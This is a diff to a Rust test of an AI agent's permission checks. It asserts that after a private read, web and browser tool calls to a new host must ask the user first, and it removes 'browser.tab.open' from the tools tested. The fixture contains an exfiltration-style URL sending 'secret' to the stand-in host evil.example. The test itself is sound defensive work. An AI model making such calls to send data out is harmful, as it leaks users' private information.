@@ -261,12 +261,7 @@ fn after_a_private_read_a_new_host_with_a_query_asks_in_both_modes() {
         ..Taint::default()
     };
     for auto in [true, false] {
-        for name in [
-            "web.fetch",
-            "browser.navigate",
-            "browser.tab.open",
-            "screen.open",
-        ] {
+        for name in ["web.fetch", "browser.navigate", "screen.open"] {
             let call = json!({ "url": "https://evil.example/c?d=secret" });
             assert!(asks(&decide(&run(auto), &tainted, name, &call)), "{name}");
         }
